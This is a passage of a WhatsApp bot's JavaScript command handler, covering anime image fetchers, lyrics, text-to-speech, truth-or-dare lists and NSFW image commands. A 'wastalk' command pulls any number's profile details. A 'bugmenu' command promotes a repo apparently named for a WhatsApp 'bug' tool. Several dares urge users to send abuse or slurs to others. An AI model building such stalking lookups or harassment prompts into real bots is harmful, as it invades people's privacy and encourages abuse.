if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
PrexzyVilla.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'lyrics': {
if (!text) return replygcprexzy(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
await PrexzyStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
replygcprexzy(`
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim())
}
break
case 'pick': {
            	if (!m.isGroup) return PrexzyStickgroup()
            	if (!text) return replygcprexzy(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await PrexzyVilla.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let prexzyshimts = member[Math.floor(Math.random() * member.length)]
             PrexzyVilla.sendMessage(from, { 
text: `The most *${text}* here is *@${prexzyshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[prexzyshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./PrexzyMedia/theme/nyxpic.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
     case 'say': case 'tts': case 'gtts':{
if (!text) return replygcprexzy('Where is the text?')
            let texttts = text
            const prexzyrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return PrexzyVilla.sendMessage(m.chat, {
                audio: {
                    url: prexzyrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replygcprexzy(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    case 'quotes':
const quoteprexzy = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quoteprexzy.data.quote.body}\n\n*${themeemoji} Author:* ${quoteprexzy.data.quote.author}`
return replygcprexzy(textquotes)
break
case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner Precious Ayomide through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const prexzydare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              PrexzyVilla.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ prexzydare }, {quoted:m})
              break
                            break
                            case 'whatsappstalk': case 'wastalk': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} 1234567890`);

    try {
        let number = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        let info = await PrexzyVilla.onWhatsApp(number);

        if (!info.length) {
            return replygcprexzy('*⚠️ This number is not registered on WhatsApp.*');
        }

        let ppUrl;
        try {
            ppUrl = await PrexzyVilla.profilePictureUrl(number, 'image');
        } catch {
            ppUrl = 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg'; // Default WhatsApp logo
        }

        let about = await PrexzyVilla.fetchStatus(number).catch(() => null);
        let userName = about ? about.status : 'Hidden/Not Available';

        let result = `🔍 *WhatsApp User Information*\n\n`;
        result += `📞 *Number:* ${text}\n`;
        result += `👤 *Name:* ${userName}\n`;
        result += `📌 *About:* ${about ? about.status : 'Hidden/Not Available'}\n`;
        result += `🕒 *Last Seen:* ${about ? new Date(about.setAt * 1000).toLocaleString() : 'Hidden/Not Available'}\n\n`;
        result += `DONE BY QUEEN NYX 👑`;

        PrexzyVilla.sendMessage(m.chat, {
            image: { url: ppUrl },
            caption: result
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy('*❌ Failed to fetch WhatsApp details. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'checkidch': 
case 'idch': {
    if (!text) return replygcprexzy(`📌 *Please provide a WhatsApp Channel link!*\n\nExample:\n*${prefix + command}* https://whatsapp.com/channel/xxxxxxxx`);

    if (!text.includes("https://whatsapp.com/channel/")) {
        return replygcprexzy('❌ *Invalid WhatsApp Channel link!*');
    }

    try {
        replygcprexzy('*🔍 Fetching WhatsApp Channel details...*');

        let channelId = text.split('https://whatsapp.com/channel/')[1];
        let res = await PrexzyVilla.newsletterMetadata("invite", channelId);

        if (!res || !res.id) {
            return replygcprexzy('❌ *Failed to fetch channel details. Make sure the link is correct!*');
        }

        let channelInfo = `📌 *WHATSAPP CHANNEL INFO*\n\n`;
        channelInfo += `🆔 *ID:* ${res.id}\n`;
        channelInfo += `📛 *Name:* ${res.name}\n`;
        channelInfo += `👥 *Followers:* ${res.subscribers}\n`;
        channelInfo += `📡 *Status:* ${res.state}\n`;
        channelInfo += `✅ *Verified:* ${res.verification == "VERIFIED" ? "Yes ✅" : "No ❌"}\n\n`;
        channelInfo += `DONE BY QUEEN NYX 👑`;

        return replygcprexzy(channelInfo);

    } catch (error) {
        console.error(error);
        return replygcprexzy('❌ *Error fetching WhatsApp Channel details. Try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'sttoimg': {
    if (!m.quoted || m.quoted.mtype !== 'stickerMessage') {
        return replygcprexzy('⚠️ Reply to a sticker to convert it to an image.');
    }

    try {
        replygcprexzy('*⏳ Converting sticker to image...*');

        let media = await m.quoted.download();
        let filePath = './temp_sticker.webp';
        let outputPath = './temp_image.png';

        await writeFile(filePath, media);

        exec(`ffmpeg -i ${filePath} ${outputPath}`, async (error) => {
            if (error) {
                return replygcprexzy('*❌ Failed to convert sticker to image.*\n\nDONE BY QUEEN NYX 👑');
            }

            PrexzyVilla.sendMessage(m.chat, {
                image: { url: outputPath },
                caption: `✅ *Sticker converted to image!*\n\nDONE BY QUEEN NYX 👑`
            }, { quoted: m });
        });

    } catch (error) {
        console.error(error);
        replygcprexzy('*❌ Error converting sticker to image.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const prexzytruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              PrexzyVilla.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ prexzytruth }, {quoted:m})
              break
              case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
PrexzyVilla.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
PrexzyVilla.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'animeawoo':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecringe':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'ban': {
    if (!PrexzyTheCreator) return replygcprexzy('❌ *Only the owner can use this command.*');
    await banUser(m, PrexzyVilla);
}
break
case 'unban': {
    if (!PrexzyTheCreator) return replygcprexzy('❌ *Only the owner can use this command.*');
    await unbanUser(m, PrexzyVilla);
}
break
case 'animewaifu':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await PrexzyVilla.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await PrexzyVilla.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await PrexzyVilla.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await PrexzyVilla.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await PrexzyVilla.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await PrexzyVilla.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await PrexzyVilla.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await PrexzyVilla.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await PrexzyVilla.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await PrexzyVilla.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'anime': {
if (!text) return replygcprexzy(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await PrexzyStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcprexzy(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await PrexzyVilla.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
                case 'bugmenu': {
    let githubLink = 'https://github.com/Prexzybooster/PREXZY-BUG-V4';
    let whatsappChannel = 'Join our WhatsApp channel for more updates: https://whatsapp.com/channel/0029VapyPnMKAwEk3YuHAb3s'; // Replace with your channel link

    let response = `🚀 *BUG MENU - PREXZY BUG V4* 🚀\n\n🔗 *GitHub Repository:*\n${githubLink}\n\n📢 *For more info, check our WhatsApp Channel:*\n${whatsappChannel}\n\nDONE BY QUEEN NYX 👑`;

    replygcprexzy(response);
}
break
case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return PrexzyStickgroup()
if (!AntiNsfw) return replygcprexzy(mess.nsfw)
                await PrexzyStickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                PrexzyVilla.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return PrexzyStickgroup()
if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return PrexzyStickgroup()
if (!AntiNsfw) return replygcprexzy(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
